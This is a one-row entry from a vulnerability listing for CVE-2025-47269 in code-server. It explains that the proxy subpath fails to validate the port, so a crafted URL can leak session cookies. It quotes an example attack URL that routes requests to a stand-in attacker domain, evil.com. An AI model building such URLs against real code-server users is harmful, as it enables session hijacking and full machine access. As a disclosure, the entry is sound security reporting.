| 47 | CVE-2025-47269 | 8.3  | HIGH | code-server runs VS Code on any machine anywhere through browser access. Prior to version 4.99.4, a maliciously crafted URL using the proxy subpath can result in the attacker gaining access to the session token. Failure to properly validate the port for a proxy request can result in proxying to an arbitrary domain. The malicious URL `https://<code-server>/proxy/test@evil.com/path` would be proxied to `test@evil.com/path` where the attacker could exfiltrate a user`s session token. Any user who runs code-server with the built-in proxy enabled and clicks on maliciously crafted links that go to their code-server instances with reference to /proxy. Normally this is used to proxy local ports, however the URL can reference the attacker`s domain instead, and the connection is then proxied to that domain, which will include sending cookies. With access to the session cookie, the attacker can then log into code-server and have full access to the machine hosting code-server as the user running code-server. This issue has been patched in version 4.99.4. | [1]https://github.com/coder/code-server/commit/47d6d3ada5aadef6d221f3d612401eb3dad9299e<br>[2]https://github.com/coder/code-server/releases/tag/v4.99.4<br>[3]https://github.com/coder/code-server/security/advisories/GHSA-p483-wpfp-42cj |
